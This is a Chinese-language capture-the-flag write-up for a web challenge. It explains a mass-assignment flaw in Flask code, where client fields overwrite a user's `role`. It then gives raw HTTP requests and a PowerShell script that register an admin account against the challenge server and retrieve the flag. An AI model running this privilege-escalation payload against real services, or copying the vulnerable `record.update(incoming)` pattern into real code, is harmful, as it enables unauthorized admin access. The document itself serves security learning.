# A Massive Problem

## 题目信息

- 类型：Web
- 题目状态：已解出
- 目标：http://23.179.17.92:5556
- 核心漏洞：Mass Assignment，客户端可控字段覆盖服务端默认 `role`，进而垂直越权到 `/admin`

## 入口与现象

题目给了源码，先看注册逻辑：

```python
record = {
    'username': username,
    'password': password,
    'role': 'standard',
    'full_name': full_name,
    'title': title,
    'team': team
}
record.update(incoming)
```

这里本来给新用户固定了 `role = 'standard'`，但后面又直接 `record.update(incoming)`，等于把客户端传来的任意同名字段重新覆盖了一遍。也就是说，只要注册时额外带上 `role=admin`，插入数据库时写进去的就是管理员角色。

继续看 `/admin`：

```python
@app.route('/admin')
def admin():
    if 'username' not in session:
        return redirect(url_for('login_page'))
    if session.get('role') != 'admin':
        return redirect(url_for('dashboard'))
    return render_template('admin.html', username=session.get('username'), flag=os.getenv('FLAG', 'CIT{test_flag}'))
```

这里的鉴权本身没问题，问题在于前面的注册和资料更新接口都信任了客户端传来的 `role`。所以题目描述里说 “Improper Authorization has been fixed”，其实只是把 `/admin` 入口的判断补上了，但用户对象的角色来源仍然可控。

## 分析过程

先确认注册接口：

```python
@app.route('/api/register', methods=['POST'])
def register():
    incoming = request.get_json(silent=True) or request.form.to_dict()
    ...
    record = {
        'username': username,
        'password': password,
        'role': 'standard',
        'full_name': full_name,
        'title': title,
        'team': team
    }
    record.update(incoming)
    ...
    conn.execute(
        'insert into users (username, password, role, full_name, title, team) values (?, ?, ?, ?, ?, ?) '
        'on conflict(username) do update set password=excluded.password, role=excluded.role, full_name=excluded.full_name, title=excluded.title, team=excluded.team',
        (record['username'], record['password'], record['role'], record['full_name'], record['title'], record['team'])
    )
```

关键点有两个：

1. `record.update(incoming)` 允许攻击者覆盖默认字段。
2. 最终 SQL 直接使用 `record['role']` 入库，没有白名单或服务端强制赋值。

再看资料更新接口：

```python
record = {
    'username': current['username'],
    'password': current['password'],
    'role': current['role'],
    'full_name': current['full_name'],
    'title': current['title'],
    'team': current['team']
}
record.update(incoming)
...
conn.execute(
    'update users set password = ?, role = ?, full_name = ?, title = ?, team = ? where username = ?',
    (record['password'], record['role'], record['full_name'], record['title'], record['team'], current['username'])
)
```

这说明即使注册时不提权，登录普通用户后向 `/api/profile` 补一个 `role=admin` 也一样能完成提权。不过这题最短利用链还是直接在注册时覆盖 `role`。

## 利用过程

1. 向 `/api/register` 正常提交注册信息，并额外加入 `role=admin`。
2. 用刚注册的账号登录，后端会把数据库里的 `role` 写进 session。
3. 访问 `/admin`，因为 `session['role'] == 'admin'`，直接返回管理员页面和 flag。

线上验证时，请求体如下：

```http
POST /api/register HTTP/1.1
Host: 23.179.17.92:5556
Content-Type: application/json

{
  "username": "massiveadmin_xxxxxxxx",
  "password": "Aa1!passw0rd",
  "full_name": "Massive Admin",
  "title": "Operator",
  "team": "Platform",
  "role": "admin"
}
```

随后正常登录：

```http
POST /api/login HTTP/1.1
Host: 23.179.17.92:5556
Content-Type: application/json

{
  "username": "massiveadmin_xxxxxxxx",
  "password": "Aa1!passw0rd"
}
```

最后带 session 访问：

```http
GET /admin HTTP/1.1
Host: 23.179.17.92:5556
Cookie: session=...
```

## 关键 payload / 命令

```powershell
$base='http://23.179.17.92:5556'
$u='massiveadmin_'+[guid]::NewGuid().ToString('N').Substring(0,8)
$p='Aa1!passw0rd'
$s=New-Object Microsoft.PowerShell.Commands.WebRequestSession

Invoke-WebRequest -UseBasicParsing -Uri "$base/api/register" -Method POST -ContentType 'application/json' -Body (@{
  username=$u
  password=$p
  full_name='Massive Admin'
  title='Operator'
  team='Platform'
  role='admin'
} | ConvertTo-Json) -WebSession $s

Invoke-WebRequest -UseBasicParsing -Uri "$base/api/login" -Method POST -ContentType 'application/json' -Body (@{
  username=$u
  password=$p
} | ConvertTo-Json) -WebSession $s

Invoke-WebRequest -UseBasicParsing -Uri "$base/admin" -WebSession $s
```

关键回显中拿到：

```text
CIT{M@ss_@ssignm3nt_Pr1v3sc}
```

## Flag

```text
CIT{M@ss_@ssignm3nt_Pr1v3sc}
```

## 总结

这题的核心不是 `/admin` 本身缺鉴权，而是用户对象构造时发生了典型的 mass assignment。开发者虽然在页面入口加了 `session['role'] == 'admin'` 判断，但注册和资料更新接口依旧允许客户端覆盖 `role`，导致普通用户可以自行把自己注册成管理员，最终直接读取管理员页面中的 flag。
